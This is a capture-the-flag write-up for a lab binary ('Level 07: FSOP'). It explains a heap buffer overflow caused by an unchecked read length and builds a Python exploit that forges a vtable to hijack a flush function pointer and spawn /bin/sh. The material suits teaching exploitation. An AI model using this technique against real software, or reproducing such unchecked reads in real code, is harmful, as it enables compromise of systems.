# Level 07: FSOP

## 1. Reconnaissance

After analyzing the source code, we can identify several interesting points that will help us exploit the binary.

### 1.1. Information leaks

The program leaks the address of the `win()` function when a new session starts:

```c
snprintf(line, sizeof line, "[FSOP] loader @ %p\n", (void *)win);
```

The `win()` function executes `/bin/sh`:

```c
__attribute__((used)) static void win(void) {
    system("/bin/sh");
}
```

This means we already have the address of our target function, so we don't need to bypass ASLR for `win()`.

Additionally, whenever we create a stream, the program leaks its heap address:

```c
snprintf(line, sizeof line, "[FSOP] stream %ld @ %p\n",
         i, (void *)streams[i]);
```

We can use these leaks to calculate the distance between two allocated streams.

### 1.2. Identifying the vulnerability

Looking at option 2, we can find the vulnerable code:

```c
case 2: {
    put(fd, "slot: ");
    long i = rd_long(fd);
    if (i < 0 || i >= MAX_STREAMS || !streams[i]) break;

    put(fd, "len: ");
    long n = rd_long(fd);

    put(fd, "data: ");
    read(fd, streams[i]->data, n);
    break;
}
```

The problem is that the program allows us to control `n` without checking whether it exceeds the size of `data`.

Our structure is defined as follows:

```c
struct stream {
    struct vtable *vt;
    char data[DATA_SIZE];
};
```

Since `DATA_SIZE` is 64 bytes, we can write more than 64 bytes into `data`, causing a **heap buffer overflow**.

### 1.3. Understanding the vtable

We also have an interesting structure:

```c
struct vtable {
    void (*flush)(struct stream *);
    void (*close)(struct stream *);
};
```

Each stream contains a pointer to this vtable:

```c
struct stream {
    struct vtable *vt;
    char data[DATA_SIZE];
};
```

When we select option 3, the program executes:

```c
streams[i]->vt->flush(streams[i]);
```

This is particularly interesting because we can potentially control the address of the vtable pointer and consequently control which function gets called.

### 1.4. Our exploitation strategy

Our objective is to make the program execute `win()` through the `flush()` function pointer.

However, we cannot simply overwrite the stream's vtable pointer with the address of `win()`.

Why?

Because the program dereferences the vtable pointer first and then reads the first function pointer from the address it points to.

In other words:

```c
streams[i]->vt->flush(streams[i]);
```

The program expects `vt` to point to a structure containing function pointers.

Therefore, our solution is to create a **fake vtable** inside the first stream's data buffer.

We will:

1. Store the address of `win()` in the first 8 bytes of stream 0's data.
2. Use the heap overflow to overwrite stream 1's vtable pointer.
3. Make stream 1's vtable pointer point to the beginning of our fake vtable.
4. Trigger `flush()` on stream 1.

The resulting call chain will be:

```text
stream1->vt
      |
      v
   fake_vt
      |
      +---- flush = win()
                     |
                     v
                 system("/bin/sh")
```

### 1.5. Understanding the heap layout

We allocate two streams:

- Stream 0 at `addr0`.
- Stream 1 at `addr1`.

The stream structure has the following layout:

```text
        stream 0 (addr0)                      stream 1 (addr1)
 ┌──────────────────────────┐          ┌──────────────────────────┐
 │ vt  = &default_vt  (0x00)│          │ vt  = &default_vt  (0x00)│
 ├──────────────────────────┤          ├──────────────────────────┤
 │ data[0]  (0x08)          │          │ data[0]  (0x08)          │
 │   ...                    │          │   ...                    │
 │ data[63]                 │          │ data[63]                 │
 └──────────────────────────┘          └──────────────────────────┘
        ▲                                         ▲
        │                                         │
        └───────────── offset ────────────────────┘
                 = addr1 - (addr0 + 8)
```

The first 8 bytes of the stream are occupied by the vtable pointer. Therefore, `data` starts at `addr0 + 8`.

Since our overflow starts at `streams[0]->data`, the distance to the next stream's vtable pointer is:

```python
offset = addr1 - (addr0 + 8)
```

We calculate this dynamically using the leaked heap addresses instead of assuming a fixed offset.

## 2. Exploitation

Now that we understand the vulnerability and the vtable mechanism, we can build our exploit.

### 2.1. Allocate two streams

First, we create two streams:

```python
addr0 = create(r, 0)
addr1 = create(r, 1)
```

We need two streams so that an overflow from the first stream can reach the second stream's vtable pointer.

The exploit relies on the allocator placing them next to each other in the expected heap layout.

### 2.2. Calculate the overflow offset

We calculate the distance between the beginning of stream 0's data and the beginning of stream 1:

```python
offset = addr1 - (addr0 + 8)
```

This tells us how many bytes we need to write before reaching `stream1->vt`.

### 2.3. Create our fake vtable

We place our fake vtable at the beginning of stream 0's data:

```python
fake_vt_addr = addr0 + 8
```

The first entry of the fake vtable is the address of `win()`:

```python
payload = p64(win)
```

Since the first entry corresponds to `flush`, the program will interpret the address of `win()` as the flush function pointer.

### 2.4. Overwrite stream 1's vtable pointer

Next, we add padding until we reach stream 1's vtable pointer.

Then we append the address of our fake vtable:

```python
payload += b"\x00" * (offset - 8)
payload += p64(fake_vt_addr)
```

Our complete payload looks like this:

```text
┌────────────────────────────────────────────┐
│              Payload layout                │
├────────────────────────────────────────────┤
│ p64(win)                                   │
│                                            │
│ Fake vtable: flush = win                   │
├────────────────────────────────────────────┤
│ Padding (offset - 8 bytes)                 │
├────────────────────────────────────────────┤
│ p64(fake_vt_addr)                          │
│                                            │
│ Overwrites stream1->vt                     │
└────────────────────────────────────────────┘
```

We then send the payload through option 2:

```python
write_stream(r, 0, payload)
```

This overflows stream 0's data buffer and overwrites stream 1's vtable pointer.

### 2.5. Trigger the exploit

Finally, we select option 3 and flush stream 1:

```python
flush_stream(r, 1)
```

The program executes:

```c
streams[1]->vt->flush(streams[1]);
```

Since we control `streams[1]->vt`, the program dereferences our fake vtable and retrieves the address of `win()`.

The result is:

```text
stream1->vt->flush(stream1)
              |
              v
            win()
              |
              v
       system("/bin/sh")
              |
              v
            SHELL!
```

## 3. Final result

We successfully exploit a heap buffer overflow to overwrite a neighboring stream's vtable pointer.

By creating a fake vtable inside the first stream's data buffer and redirecting the second stream to it, we hijack the indirect function call and execute the leaked `win()` function.

**Vulnerability:** Heap buffer overflow.

**Exploitation technique:** Fake vtable / function pointer hijacking.

**Information leaks:** `win()` address and heap addresses.

**Final objective:** Execute `system("/bin/sh")` and obtain a shell.
